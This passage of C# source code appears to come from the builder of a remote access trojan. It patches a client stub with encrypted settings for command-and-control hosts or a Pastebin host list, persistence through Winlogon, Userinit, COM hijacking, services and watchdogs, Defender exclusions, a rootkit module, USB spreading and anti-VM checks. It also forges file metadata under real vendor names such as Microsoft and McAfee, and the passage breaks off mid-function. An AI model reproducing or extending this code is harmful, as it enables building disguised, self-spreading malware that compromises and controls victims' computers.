				GridBuilds.ColumnHeadersDefaultCellStyle.SelectionBackColor = Color.FromArgb(40, 40, 40);
				GridBuilds.ColumnHeadersDefaultCellStyle.ForeColor = primary;
				GridBuilds.ColumnHeadersDefaultCellStyle.SelectionForeColor = primary;
			}
			if (GridBuilds.DefaultCellStyle != null)
			{
				GridBuilds.DefaultCellStyle.BackColor = Color.FromArgb(64, 64, 64);
				GridBuilds.DefaultCellStyle.ForeColor = primary;
				GridBuilds.DefaultCellStyle.SelectionBackColor = primary;
				GridBuilds.DefaultCellStyle.SelectionForeColor = Color.White;
			}
			{
				foreach (DataGridViewRow item in (IEnumerable)GridBuilds.Rows)
				{
					foreach (DataGridViewCell cell in item.Cells)
					{
						cell.Style.ForeColor = primary;
					}
				}
				return;
			}
		}
		GridIps.BackgroundColor = Color.White;
		if (GridIps.ColumnHeadersDefaultCellStyle != null)
		{
			GridIps.ColumnHeadersDefaultCellStyle.BackColor = Color.White;
			GridIps.ColumnHeadersDefaultCellStyle.SelectionBackColor = Color.White;
			GridIps.ColumnHeadersDefaultCellStyle.ForeColor = text;
			GridIps.ColumnHeadersDefaultCellStyle.SelectionForeColor = text;
		}
		if (GridIps.DefaultCellStyle != null)
		{
			GridIps.DefaultCellStyle.BackColor = Color.White;
			GridIps.DefaultCellStyle.ForeColor = text;
			GridIps.DefaultCellStyle.SelectionBackColor = primary;
			GridIps.DefaultCellStyle.SelectionForeColor = Color.White;
		}
		if (GridBuilds == null)
		{
			return;
		}
		GridBuilds.BackgroundColor = Color.White;
		if (GridBuilds.ColumnHeadersDefaultCellStyle != null)
		{
			GridBuilds.ColumnHeadersDefaultCellStyle.BackColor = Color.White;
			GridBuilds.ColumnHeadersDefaultCellStyle.SelectionBackColor = Color.White;
			GridBuilds.ColumnHeadersDefaultCellStyle.ForeColor = primary;
			GridBuilds.ColumnHeadersDefaultCellStyle.SelectionForeColor = primary;
		}
		if (GridBuilds.DefaultCellStyle != null)
		{
			GridBuilds.DefaultCellStyle.BackColor = Color.White;
			GridBuilds.DefaultCellStyle.ForeColor = primary;
			GridBuilds.DefaultCellStyle.SelectionBackColor = primary;
			GridBuilds.DefaultCellStyle.SelectionForeColor = Color.White;
		}
		foreach (DataGridViewRow item2 in (IEnumerable)GridBuilds.Rows)
		{
			foreach (DataGridViewCell cell2 in item2.Cells)
			{
				cell2.Style.ForeColor = primary;
			}
		}
	}

	private void checkBox1_CheckedChanged(object sender, EventArgs e)
	{
		panel1.Enabled = checkBox1.Checked;
	}

	private void checkBoxCmdlineAutorun_CheckedChanged(object sender, EventArgs e)
	{
		bool enabled = checkBoxCmdlineAutorun.Checked;
		rjComboBoxCmdlineDir.Enabled = enabled;
		rjTextBoxCmdlineProcess.Enabled = enabled;
	}

	private void checkBox2_CheckedChanged(object sender, EventArgs e)
	{
		rjTextBox9.Enabled = checkBox2.Checked;
	}

	private void checkBox3_CheckedChanged(object sender, EventArgs e)
	{
		bool pastebinEnabled = checkBox3.Checked;
		rjTextBox8.Enabled = pastebinEnabled;
		GridIps.Enabled = !pastebinEnabled;
		rjButton1.Enabled = !pastebinEnabled;
		rjButton2.Enabled = !pastebinEnabled;
	}

	private void checkBox5_CheckedChanged(object sender, EventArgs e)
	{
		rjTextBox4.Enabled = checkBox5.Checked;
		rjComboBox2.Enabled = checkBox5.Checked;
		rjTextBox5.Enabled = checkBox5.Checked;
	}

	private void checkBox11_CheckedChanged(object sender, EventArgs e)
	{
		bool enabled = checkBox11.Checked;
		rjComboBox4.Enabled = enabled;
		rjTextBox10.Enabled = enabled;
		checkBox12.Enabled = enabled;
		checkBox13.Enabled = enabled;
		checkBox14.Enabled = enabled;
		if (enabled)
		{
			checkBox12_CheckedChanged(null, EventArgs.Empty);
			checkBox13_CheckedChanged(null, EventArgs.Empty);
			checkBox14_CheckedChanged(null, EventArgs.Empty);
		}
		else
		{
			rjTextBox11.Enabled = false;
			rjTextBox12.Enabled = false;
			rjTextBox13.Enabled = false;
			rjComboBox5.Enabled = false;
			checkBox14.Checked = false;
		}
	}

	private void checkBox12_CheckedChanged(object sender, EventArgs e)
	{
		rjTextBox11.Enabled = checkBox11.Checked && checkBox12.Checked;
	}

	private void checkBox13_CheckedChanged(object sender, EventArgs e)
	{
		rjTextBox12.Enabled = checkBox11.Checked && checkBox13.Checked;
	}

	private void checkBox14_CheckedChanged(object sender, EventArgs e)
	{
		bool enabled = checkBox11.Checked && checkBox14.Checked;
		rjTextBox13.Enabled = enabled;
		rjComboBox5.Enabled = enabled;
	}

	private void LoadBuilds()
	{
		foreach (BuildStats.BuildInfo info in BuildStats.Builds)
		{
			AddBuildToGrid(info);
		}
	}

	private void SaveBuildRecord(string name, string path)
	{
		string text = rjTextBox7.Texts;
		if (string.IsNullOrWhiteSpace(text))
		{
			text = "Default";
		}
		string processName = "Client";
		BuildStats.AddBuild(name, text, processName, path);
		GridBuilds.Rows.Clear();
		LoadBuilds();
	}

	private void AddBuildToGrid(BuildStats.BuildInfo info)
	{
		if (GridBuilds == null)
		{
			return;
		}
		int rowIndex = GridBuilds.Rows.Add(info.BuildName, info.Group, info.ProcessName, info.Users, info.DateCreated, info.Path);
		DataGridViewRow dataGridViewRow = GridBuilds.Rows[rowIndex];
		Color textColor = FormMaterial.PrimaryColor;
		foreach (DataGridViewCell cell in dataGridViewRow.Cells)
		{
			cell.Style.ForeColor = textColor;
		}
	}

	public void IncrementUsers(string group)
	{
		BuildStats.IncrementUsers(group);
		foreach (DataGridViewRow dataGridViewRow in (IEnumerable)GridBuilds.Rows)
		{
			if ((string)dataGridViewRow.Cells[1].Value == group)
			{
				int num = int.Parse(dataGridViewRow.Cells[3].Value.ToString());
				dataGridViewRow.Cells[3].Value = num + 1;
				break;
			}
		}
	}

	private void menuDelete_Click(object sender, EventArgs e)
	{
		if (GridBuilds.SelectedRows.Count == 0)
		{
			return;
		}
		foreach (DataGridViewRow dataGridViewRow in GridBuilds.SelectedRows)
		{
			string text = dataGridViewRow.Cells[5].Value as string;
			string group = dataGridViewRow.Cells[1].Value as string;
			if (!string.IsNullOrEmpty(text) && File.Exists(text))
			{
				try
				{
					File.Delete(text);
				}
				catch
				{
				}
			}
			GridBuilds.Rows.Remove(dataGridViewRow);
			BuildStats.RemoveBuild(group);
		}
		SaveBuildList();
	}

	private void menuClear_Click(object sender, EventArgs e)
	{
		if (GridBuilds.Rows.Count != 0)
		{
			GridBuilds.Rows.Clear();
			BuildStats.ClearAll();
			SaveBuildList();
		}
	}

	private void SaveBuildList()
	{
		try
		{
			if (!Directory.Exists("local"))
			{
				Directory.CreateDirectory("local");
			}
			File.WriteAllText("local\\Builds.json", JsonConvert.SerializeObject(BuildStats.Builds, Formatting.Indented));
		}
		catch
		{
		}
	}

	private void GridBuilds_CellDoubleClick(object sender, DataGridViewCellEventArgs e)
	{
		if (e.RowIndex < 0)
		{
			return;
		}
		_ = GridBuilds.Rows[e.RowIndex].Cells[0].Value;
		string text = GridBuilds.Rows[e.RowIndex].Cells[5].Value as string;
		string group = GridBuilds.Rows[e.RowIndex].Cells[1].Value as string;
		if (!string.IsNullOrEmpty(text) && File.Exists(text))
		{
			try
			{
				Process.Start(text);
			}
			catch
			{
			}
		}
		IncrementUsers(group);
	}

	private void WriteSettings(ModuleDefMD moduleDefMd)
	{
		string randomCharactersAscii = Randomizer.getRandomCharactersAscii();
		string randomCharactersAscii2 = Randomizer.getRandomCharactersAscii();
		string randomCharactersAscii3 = Randomizer.getRandomCharactersAscii();
		EncryptString encryptString = new EncryptString();
		string str = " !\"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`abcdefghijklmnopqrstuvwxyz{|}~";
		encryptString.dec = Methods.Shuffle(str);
		encryptString.enc = Methods.Shuffle(encryptString.dec);
		X509Certificate2 x509Certificate = new X509Certificate2(new X509Certificate2("ServerCertificate.p12", "", X509KeyStorageFlags.Exportable).Export(X509ContentType.Cert));
		moduleDefMd.Resources.Add(new EmbeddedResource(randomCharactersAscii, Xor.DecodEncod(x509Certificate.Export(X509ContentType.Cert), Encoding.ASCII.GetBytes(randomCharactersAscii3))));
		if (checkBox4.Checked)
		{
			moduleDefMd.Resources.Add(new EmbeddedResource(randomCharactersAscii2, Xor.DecodEncod(File.ReadAllBytes("Stub\\UserMode.obf.dll"), Encoding.ASCII.GetBytes(randomCharactersAscii3))));
		}
		foreach (TypeDef typeDef in moduleDefMd.Types)
		{
			foreach (MethodDef methodDef in typeDef.Methods)
			{
				if (methodDef.Body == null)
				{
					continue;
				}
				for (int i = 0; i < methodDef.Body.Instructions.Count(); i++)
				{
					if (methodDef.Body.Instructions[i].OpCode != OpCodes.Ldstr)
					{
						continue;
					}
					if (typeDef.Name != "EncryptString")
					{
						if (!(typeDef.Name == "Config"))
						{
							methodDef.Body.Instructions[i].Operand = encryptString.Encrypt(methodDef.Body.Instructions[i].Operand as string);
							continue;
						}
						if (methodDef.Body.Instructions[i].Operand as string == "Software\\gogoduck" || methodDef.Body.Instructions[i].Operand as string == "Win32_Processor" || methodDef.Body.Instructions[i].Operand as string == "Name" || methodDef.Body.Instructions[i].Operand as string == "dd.MM.yyyy" || methodDef.Body.Instructions[i].Operand as string == "Win32_VideoController" || methodDef.Body.Instructions[i].Operand as string == "," || methodDef.Body.Instructions[i].Operand as string == "Admin" || methodDef.Body.Instructions[i].Operand as string == "User" || methodDef.Body.Instructions[i].Operand as string == "true")
						{
							methodDef.Body.Instructions[i].Operand = encryptString.Encrypt(methodDef.Body.Instructions[i].Operand as string);
						}
					}
					if (typeDef.Name == "EncryptString")
					{
						if (methodDef.Body.Instructions[i].Operand as string == "%dec%")
						{
							methodDef.Body.Instructions[i].Operand = encryptString.dec;
						}
						if (methodDef.Body.Instructions[i].Operand as string == "%enc%")
						{
							methodDef.Body.Instructions[i].Operand = encryptString.enc;
						}
						continue;
					}
					if (methodDef.Body.Instructions[i].Operand as string == "%Hosts%")
					{
						bool usePastebin = checkBox3 != null && checkBox3.Checked && rjTextBox8 != null && !string.IsNullOrWhiteSpace(rjTextBox8.Texts);
						if (usePastebin)
						{
							string pastebinUrl = rjTextBox8.Texts.Trim();
							if (!pastebinUrl.Contains("/raw/"))
							{
								if (pastebinUrl.Contains("pastebin.com/"))
								{
									string pasteId = pastebinUrl.Substring(pastebinUrl.LastIndexOf("/") + 1);
									if (pasteId.Contains("?"))
									{
										pasteId = pasteId.Substring(0, pasteId.IndexOf("?"));
									}
									pastebinUrl = "https://pastebin.com/raw/" + pasteId;
								}
								else
								{
									usePastebin = false;
								}
							}
							if (usePastebin)
							{
								methodDef.Body.Instructions[i].Operand = encryptString.Encrypt("PASTEBIN:" + pastebinUrl);
							}
						}
						if (!usePastebin)
						{
							List<string> list = new List<string>();
							foreach (DataGridViewRow dataGridViewRow in (IEnumerable)GridIps.Rows)
							{
								if (dataGridViewRow.Cells.Count > 0 && dataGridViewRow.Cells[0].Value != null)
								{
									list.Add((string)dataGridViewRow.Cells[0].Value);
								}
							}
							if (list.Count > 0)
							{
								methodDef.Body.Instructions[i].Operand = encryptString.Encrypt(string.Join(";", list));
							}
							else
							{
								methodDef.Body.Instructions[i].Operand = encryptString.Encrypt("127.0.0.1:8463");
							}
						}
					}
					if (methodDef.Body.Instructions[i].Operand as string == "%Version%")
					{
						methodDef.Body.Instructions[i].Operand = encryptString.Encrypt("3.1");
					}
					if (methodDef.Body.Instructions[i].Operand as string == "%Group%")
					{
						methodDef.Body.Instructions[i].Operand = encryptString.Encrypt(rjTextBox7.Texts);
					}
					if (methodDef.Body.Instructions[i].Operand as string == "%Mutex%")
					{
						methodDef.Body.Instructions[i].Operand = encryptString.Encrypt(rjTextBox6.Texts);
					}
					if (methodDef.Body.Instructions[i].Operand as string == "%Key%")
					{
						methodDef.Body.Instructions[i].Operand = encryptString.Encrypt(randomCharactersAscii3);
					}
					if (methodDef.Body.Instructions[i].Operand as string == "%Cerificate%")
					{
						methodDef.Body.Instructions[i].Operand = encryptString.Encrypt(randomCharactersAscii);
					}
					if (methodDef.Body.Instructions[i].Operand as string == "%Install%")
					{
						methodDef.Body.Instructions[i].Operand = encryptString.Encrypt(checkBox1.Checked.ToString().ToLower());
					}
					if (methodDef.Body.Instructions[i].Operand as string == "%AntiVirtual%")
					{
						methodDef.Body.Instructions[i].Operand = encryptString.Encrypt(checkBoxAntiVirtual.Checked.ToString().ToLower());
					}
					if (checkBox1.Checked)
					{
						if (methodDef.Body.Instructions[i].Operand as string == "%InstallWatchDog%")
						{
							methodDef.Body.Instructions[i].Operand = encryptString.Encrypt(checkBox5.Checked.ToString().ToLower());
						}
						if (methodDef.Body.Instructions[i].Operand as string == "%WinlogonShell%")
						{
							methodDef.Body.Instructions[i].Operand = encryptString.Encrypt(checkBoxWinlogonShell.Checked.ToString().ToLower());
						}
						if (methodDef.Body.Instructions[i].Operand as string == "%ProcessName%")
						{
							methodDef.Body.Instructions[i].Operand = encryptString.Encrypt(checkBox2.Checked.ToString().ToLower());
						}
						if (methodDef.Body.Instructions[i].Operand as string == "%ProcessNameValue%")
						{
							methodDef.Body.Instructions[i].Operand = encryptString.Encrypt(checkBox2.Checked ? rjTextBox9.Texts : "");
						}
						if (methodDef.Body.Instructions[i].Operand as string == "%ExclusionWD%")
						{
							methodDef.Body.Instructions[i].Operand = encryptString.Encrypt(checkBox8.Checked.ToString().ToLower());
						}
						if (methodDef.Body.Instructions[i].Operand as string == "%HiddenFile%")
						{
							methodDef.Body.Instructions[i].Operand = encryptString.Encrypt(checkBox6.Checked.ToString().ToLower());
						}
						if (methodDef.Body.Instructions[i].Operand as string == "%UserInit%")
						{
							methodDef.Body.Instructions[i].Operand = encryptString.Encrypt(checkBox7.Checked.ToString().ToLower());
						}
						if (methodDef.Body.Instructions[i].Operand as string == "%RootKit%")
						{
							if (checkBox4.Checked)
							{
								methodDef.Body.Instructions[i].Operand = encryptString.Encrypt(randomCharactersAscii2);
							}
							else
							{
								methodDef.Body.Instructions[i].Operand = encryptString.Encrypt("false");
							}
						}
						if (methodDef.Body.Instructions[i].Operand as string == "%Pump%")
						{
							methodDef.Body.Instructions[i].Operand = encryptString.Encrypt(checkBox9.Checked.ToString().ToLower());
						}
						if (methodDef.Body.Instructions[i].Operand as string == "%TaskClient%")
						{
							methodDef.Body.Instructions[i].Operand = encryptString.Encrypt(rjTextBox2.Texts);
						}
						if (methodDef.Body.Instructions[i].Operand as string == "%PathClient%")
						{
							methodDef.Body.Instructions[i].Operand = encryptString.Encrypt(Path.Combine(rjComboBox1.Texts, rjTextBox3.Texts));
						}
						if (methodDef.Body.Instructions[i].Operand as string == "%TaskWatchDog%")
						{
							if (checkBox5.Checked)
							{
								methodDef.Body.Instructions[i].Operand = encryptString.Encrypt(rjTextBox5.Texts);
							}
							else
							{
								methodDef.Body.Instructions[i].Operand = encryptString.Encrypt(Randomizer.getRandomCharacters());
							}
						}
						if (methodDef.Body.Instructions[i].Operand as string == "%PathWatchDog%")
						{
							if (checkBox5.Checked)
							{
								methodDef.Body.Instructions[i].Operand = encryptString.Encrypt(Path.Combine(rjComboBox2.Texts, rjTextBox4.Texts));
							}
							else
							{
								methodDef.Body.Instructions[i].Operand = encryptString.Encrypt(Randomizer.getRandomCharacters());
							}
						}
						if (methodDef.Body.Instructions[i].Operand as string == "%CmdlineAutorun%")
						{
							methodDef.Body.Instructions[i].Operand = encryptString.Encrypt(checkBoxCmdlineAutorun.Checked.ToString().ToLower());
						}
						if (methodDef.Body.Instructions[i].Operand as string == "%CmdlineDir%")
						{
							methodDef.Body.Instructions[i].Operand = encryptString.Encrypt(checkBoxCmdlineAutorun.Checked ? rjComboBoxCmdlineDir.Texts : "");
						}
						if (methodDef.Body.Instructions[i].Operand as string == "%CmdlineProcessName%")
						{
							methodDef.Body.Instructions[i].Operand = encryptString.Encrypt(checkBoxCmdlineAutorun.Checked ? rjTextBoxCmdlineProcess.Texts : "");
						}
						if (methodDef.Body.Instructions[i].Operand as string == "%ProcessCritical%")
						{
							methodDef.Body.Instructions[i].Operand = encryptString.Encrypt(checkBoxProcessCritical.Checked.ToString().ToLower());
						}
						if (methodDef.Body.Instructions[i].Operand as string == "%ProcessCriticalName%")
						{
							methodDef.Body.Instructions[i].Operand = encryptString.Encrypt(checkBoxProcessCritical.Checked ? rjTextBoxProcessCritical.Texts : "");
						}
						if (methodDef.Body.Instructions[i].Operand as string == "%WinlogonShell%")
						{
							methodDef.Body.Instructions[i].Operand = encryptString.Encrypt(checkBoxWinlogonShell.Checked.ToString().ToLower());
						}
						if (methodDef.Body.Instructions[i].Operand as string == "%ProcessName%")
						{
							methodDef.Body.Instructions[i].Operand = encryptString.Encrypt(checkBox2.Checked.ToString().ToLower());
						}
						if (methodDef.Body.Instructions[i].Operand as string == "%ProcessNameValue%")
						{
							methodDef.Body.Instructions[i].Operand = encryptString.Encrypt(checkBox2.Checked ? rjTextBox9.Texts : "");
						}
						if (methodDef.Body.Instructions[i].Operand as string == "%COMHijacking%")
						{
							methodDef.Body.Instructions[i].Operand = encryptString.Encrypt(checkBoxReserved.Checked.ToString().ToLower());
						}
						if (methodDef.Body.Instructions[i].Operand as string == "%COMHijackingCLSID%")
						{
							methodDef.Body.Instructions[i].Operand = encryptString.Encrypt(checkBoxReserved.Checked ? rjTextBoxReserved.Texts : "");
						}
						if (methodDef.Body.Instructions[i].Operand as string == "%InstallServices%")
						{
							methodDef.Body.Instructions[i].Operand = encryptString.Encrypt(checkBoxWMIStartup.Checked ? "true" : "false");
						}
						if (methodDef.Body.Instructions[i].Operand as string == "%InstallServicesValue%")
						{
							methodDef.Body.Instructions[i].Operand = encryptString.Encrypt(checkBoxWMIStartup.Checked ? rjTextBoxWMIStartup.Texts : "");
						}
						if (methodDef.Body.Instructions[i].Operand as string == "%WindowsService%")
						{
							methodDef.Body.Instructions[i].Operand = encryptString.Encrypt(checkBoxWindowsService.Checked ? "true" : "false");
						}
						if (methodDef.Body.Instructions[i].Operand as string == "%WindowsServiceName%")
						{
							methodDef.Body.Instructions[i].Operand = encryptString.Encrypt(checkBoxWindowsService.Checked ? rjTextBoxWindowsService.Texts : "");
						}
						if (methodDef.Body.Instructions[i].Operand as string == "%USBSpread%")
						{
							methodDef.Body.Instructions[i].Operand = encryptString.Encrypt(checkBoxUSBSpread.Checked.ToString().ToLower());
						}
						if (methodDef.Body.Instructions[i].Operand as string == "%USBSpreadFileName%")
						{
							methodDef.Body.Instructions[i].Operand = encryptString.Encrypt(checkBoxUSBSpread.Checked ? rjTextBoxUSBSpread.Texts : "");
						}
					}
					else
					{
						if (methodDef.Body.Instructions[i].Operand as string == "%InstallWatchDog%")
						{
							methodDef.Body.Instructions[i].Operand = encryptString.Encrypt(Randomizer.getRandomCharacters());
						}
						if (methodDef.Body.Instructions[i].Operand as string == "%WinlogonShell%")
						{
							methodDef.Body.Instructions[i].Operand = encryptString.Encrypt(Randomizer.getRandomCharacters());
						}
						if (methodDef.Body.Instructions[i].Operand as string == "%ProcessName%")
						{
							methodDef.Body.Instructions[i].Operand = encryptString.Encrypt(Randomizer.getRandomCharacters());
						}
						if (methodDef.Body.Instructions[i].Operand as string == "%ProcessNameValue%")
						{
							methodDef.Body.Instructions[i].Operand = encryptString.Encrypt(Randomizer.getRandomCharacters());
						}
						if (methodDef.Body.Instructions[i].Operand as string == "%ExclusionWD%")
						{
							methodDef.Body.Instructions[i].Operand = encryptString.Encrypt(Randomizer.getRandomCharacters());
						}
						if (methodDef.Body.Instructions[i].Operand as string == "%HiddenFile%")
						{
							methodDef.Body.Instructions[i].Operand = encryptString.Encrypt(Randomizer.getRandomCharacters());
						}
						if (methodDef.Body.Instructions[i].Operand as string == "%UserInit%")
						{
							methodDef.Body.Instructions[i].Operand = encryptString.Encrypt(Randomizer.getRandomCharacters());
						}
						if (methodDef.Body.Instructions[i].Operand as string == "%PathWatchDog%")
						{
							methodDef.Body.Instructions[i].Operand = encryptString.Encrypt(Randomizer.getRandomCharacters());
						}
						if (methodDef.Body.Instructions[i].Operand as string == "%TaskWatchDog%")
						{
							methodDef.Body.Instructions[i].Operand = encryptString.Encrypt(Randomizer.getRandomCharacters());
						}
						if (methodDef.Body.Instructions[i].Operand as string == "%Pump%")
						{
							methodDef.Body.Instructions[i].Operand = encryptString.Encrypt(Randomizer.getRandomCharacters());
						}
						if (methodDef.Body.Instructions[i].Operand as string == "%TaskClient%")
						{
							methodDef.Body.Instructions[i].Operand = encryptString.Encrypt(Randomizer.getRandomCharacters());
						}
						if (methodDef.Body.Instructions[i].Operand as string == "%PathClient%")
						{
							methodDef.Body.Instructions[i].Operand = encryptString.Encrypt(Randomizer.getRandomCharacters());
						}
						if (methodDef.Body.Instructions[i].Operand as string == "%CmdlineAutorun%")
						{
							methodDef.Body.Instructions[i].Operand = encryptString.Encrypt(Randomizer.getRandomCharacters());
						}
						if (methodDef.Body.Instructions[i].Operand as string == "%CmdlineDir%")
						{
							methodDef.Body.Instructions[i].Operand = encryptString.Encrypt(Randomizer.getRandomCharacters());
						}
						if (methodDef.Body.Instructions[i].Operand as string == "%CmdlineProcessName%")
						{
							methodDef.Body.Instructions[i].Operand = encryptString.Encrypt(Randomizer.getRandomCharacters());
						}
						if (methodDef.Body.Instructions[i].Operand as string == "%USBSpread%")
						{
							methodDef.Body.Instructions[i].Operand = encryptString.Encrypt(Randomizer.getRandomCharacters());
						}
						if (methodDef.Body.Instructions[i].Operand as string == "%USBSpreadFileName%")
						{
							methodDef.Body.Instructions[i].Operand = encryptString.Encrypt(Randomizer.getRandomCharacters());
						}
						if (methodDef.Body.Instructions[i].Operand as string == "%ProcessCritical%")
						{
							methodDef.Body.Instructions[i].Operand = encryptString.Encrypt(Randomizer.getRandomCharacters());
						}
						if (methodDef.Body.Instructions[i].Operand as string == "%ProcessCriticalName%")
						{
							methodDef.Body.Instructions[i].Operand = encryptString.Encrypt(Randomizer.getRandomCharacters());
						}
						if (methodDef.Body.Instructions[i].Operand as string == "%WinlogonShell%")
						{
							methodDef.Body.Instructions[i].Operand = encryptString.Encrypt(Randomizer.getRandomCharacters());
						}
						if (methodDef.Body.Instructions[i].Operand as string == "%ProcessName%")
						{
							methodDef.Body.Instructions[i].Operand = encryptString.Encrypt(Randomizer.getRandomCharacters());
						}
						if (methodDef.Body.Instructions[i].Operand as string == "%ProcessNameValue%")
						{
							methodDef.Body.Instructions[i].Operand = encryptString.Encrypt(Randomizer.getRandomCharacters());
						}
						if (methodDef.Body.Instructions[i].Operand as string == "%COMHijacking%")
						{
							methodDef.Body.Instructions[i].Operand = encryptString.Encrypt(Randomizer.getRandomCharacters());
						}
						if (methodDef.Body.Instructions[i].Operand as string == "%COMHijackingCLSID%")
						{
							methodDef.Body.Instructions[i].Operand = encryptString.Encrypt(Randomizer.getRandomCharacters());
						}
						if (methodDef.Body.Instructions[i].Operand as string == "%InstallServices%")
						{
							methodDef.Body.Instructions[i].Operand = encryptString.Encrypt(Randomizer.getRandomCharacters());
						}
						if (methodDef.Body.Instructions[i].Operand as string == "%InstallServicesValue%")
						{
							methodDef.Body.Instructions[i].Operand = encryptString.Encrypt(Randomizer.getRandomCharacters());
						}
						if (methodDef.Body.Instructions[i].Operand as string == "%WindowsService%")
						{
							methodDef.Body.Instructions[i].Operand = encryptString.Encrypt(Randomizer.getRandomCharacters());
						}
						if (methodDef.Body.Instructions[i].Operand as string == "%WindowsServiceName%")
						{
							methodDef.Body.Instructions[i].Operand = encryptString.Encrypt(Randomizer.getRandomCharacters());
						}
						if (methodDef.Body.Instructions[i].Operand as string == "%USBSpread%")
						{
							methodDef.Body.Instructions[i].Operand = encryptString.Encrypt(Randomizer.getRandomCharacters());
						}
						if (methodDef.Body.Instructions[i].Operand as string == "%USBSpreadFileName%")
						{
							methodDef.Body.Instructions[i].Operand = encryptString.Encrypt(Randomizer.getRandomCharacters());
						}
					}
				}
			}
		}
	}

	private void checkBoxProcessCritical_CheckedChanged(object sender, EventArgs e)
	{
		bool enabled = checkBoxProcessCritical.Checked;
		rjTextBoxProcessCritical.Enabled = enabled;
	}

	private void checkBoxWMIStartup_CheckedChanged(object sender, EventArgs e)
	{
		bool enabled = checkBoxWMIStartup != null && checkBoxWMIStartup.Checked;
		if (rjTextBoxWMIStartup != null)
		{
			rjTextBoxWMIStartup.Enabled = enabled;
		}
	}

	private void checkBoxUSBSpread_CheckedChanged(object sender, EventArgs e)
	{
		bool enabled = checkBoxUSBSpread != null && checkBoxUSBSpread.Checked;
		if (rjTextBoxUSBSpread != null)
		{
			rjTextBoxUSBSpread.Enabled = enabled;
		}
	}

	private void checkBoxWindowsService_CheckedChanged(object sender, EventArgs e)
	{
		bool enabled = checkBoxWindowsService != null && checkBoxWindowsService.Checked;
		if (rjTextBoxWindowsService != null)
		{
			rjTextBoxWindowsService.Enabled = enabled;
		}
	}

	private void checkBoxReserved_CheckedChanged(object sender, EventArgs e)
	{
		bool enabled = checkBoxReserved != null && checkBoxReserved.Checked;
		if (rjTextBoxReserved != null)
		{
			rjTextBoxReserved.Enabled = enabled;
		}
	}

	private void checkBox20_CheckedChanged(object sender, EventArgs e)
	{
		if (!checkBox20.Checked)
		{
			return;
		}
		using OpenFileDialog openFileDialog = new OpenFileDialog();
		openFileDialog.Title = "Choose Icon";
		openFileDialog.Filter = "Icons Files(*.exe;*.ico;)|*.exe;*.ico";
		openFileDialog.Multiselect = false;
		if (openFileDialog.ShowDialog() == DialogResult.OK)
		{
			if (openFileDialog.FileName.ToLower().EndsWith(".exe"))
			{
				pictureBox1.ImageLocation = Methods.GetIcon(openFileDialog.FileName);
			}
			else
			{
				pictureBox1.ImageLocation = openFileDialog.FileName;
			}
		}
	}

	private void rjButton3_Click(object sender, EventArgs e)
	{
		using OpenFileDialog openFileDialog = new OpenFileDialog();
		openFileDialog.Filter = "Executable (*.exe)|*.exe";
		if (openFileDialog.ShowDialog() == DialogResult.OK)
		{
			FileVersionInfo versionInfo = FileVersionInfo.GetVersionInfo(openFileDialog.FileName);
			TextBoxOriginalFileName.Texts = versionInfo.InternalName ?? string.Empty;
			TextBoxDescription.Texts = versionInfo.FileDescription ?? string.Empty;
			TextBoxCompany.Texts = versionInfo.CompanyName ?? string.Empty;
			TextBoxProduct.Texts = versionInfo.ProductName ?? string.Empty;
			TextBoxCopyright.Texts = versionInfo.LegalCopyright ?? string.Empty;
			TextBoxTrademarks.Texts = versionInfo.LegalTrademarks ?? string.Empty;
			TextBoxFileVersion.Texts = versionInfo.FileMajorPart + "." + versionInfo.FileMinorPart + "." + versionInfo.FileBuildPart + "." + versionInfo.FilePrivatePart;
			TextBoxProductVersion.Texts = versionInfo.FileMajorPart + "." + versionInfo.FileMinorPart + "." + versionInfo.FileBuildPart + "." + versionInfo.FilePrivatePart;
		}
	}

	private void rjButtonGenerateAssembly_Click(object sender, EventArgs e)
	{
		Random random = new Random();
		string[] companies = new string[20]
		{
			"Microsoft Corporation", "Google LLC", "Apple Inc.", "Adobe Systems", "Oracle Corporation", "Intel Corporation", "NVIDIA Corporation", "AMD Inc.", "Qualcomm Inc.", "Samsung Electronics",
			"Sony Corporation", "Dell Technologies", "HP Inc.", "Lenovo Group", "Cisco Systems", "IBM Corporation", "VMware Inc.", "Autodesk Inc.", "Symantec Corporation", "McAfee LLC"
		};
		string[] products = new string[15]
		{
			"System Manager", "Network Monitor", "Security Suite", "Update Service", "Driver Manager", "Performance Optimizer", "System Tools", "Diagnostic Utility", "Configuration Manager", "Service Host",
			"Runtime Library", "System Component", "Background Service", "Helper Service", "Core Module"
		};
		string[] descriptions = new string[15]
		{
			"System management application", "Network monitoring tool", "Security and protection service", "Automatic update component", "Device driver management", "Performance optimization utility", "System maintenance tool", "Diagnostic and troubleshooting", "Configuration management service", "Background service host",
			"Runtime support library", "Core system component", "Background helper service", "Essential system service", "Core application module"
		};
		string company = companies[random.Next(companies.Length)];
		string product = products[random.Next(products.Length)];
		string description = descriptions[random.Next(descriptions.Length)];
		int year = random.Next(2015, DateTime.Now.Year + 1);
		int major = random.Next(1, 20);
		int minor = random.Next(0, 10);
		int build = random.Next(0, 9999);
		int revision = random.Next(0, 9999);
		string version = $"{major}.{minor}.{build}.{revision}";
		TextBoxCompany.Texts = company;
		TextBoxProduct.Texts = product;
		TextBoxDescription.Texts = description;
		TextBoxCopyright.Texts = $"Copyright © {year} {company}";
		TextBoxTrademarks.Texts = product + "™";
		TextBoxOriginalFileName.Texts = product.Replace(" ", "") + ".exe";
		TextBoxFileVersion.Texts = version;
		TextBoxProductVersion.Texts = version;
	}

	private static string ResolveClientStubPath()
	{
		string baseDir = AppDomain.CurrentDomain.BaseDirectory;
		string[] candidates = new string[5]
		{
			Path.Combine(Application.StartupPath, "Stub", "Client.exe"),
			Path.Combine(baseDir, "Stub", "Client.exe"),
			Path.Combine(baseDir, "..", "Stub", "Client.exe"),
			Path.Combine(baseDir, "..", "..", "Stub", "Client.exe"),
			Path.Combine(baseDir, "..", "..", "..", "Stub", "Client.exe")
		};
		string[] array = candidates;
		foreach (string candidate in array)
		{
			try
			{
				string fullPath = Path.GetFullPath(candidate);
				if (File.Exists(fullPath))
				{
					return fullPath;
				}
			}
			catch
			{
			}
		}
		throw new FileNotFoundException("Не найден шаблон клиента Client.exe", string.Join(";", candidates.Select(Path.GetFullPath)));
	}

	private void CreateBulid(string filepath)
	{
		string exd = "";
		string text = filepath;
		string stubPath = ResolveClientStubPath();
		Directory.CreateDirectory(Path.GetDirectoryName(filepath));
		if (checkBox22.Checked)
		{
			string[] array = new string[21]
			{
				".exe", ".scr", ".com", ".pif", ".sys", ".cpl", ".msi", ".msc", ".app", ".gadget",
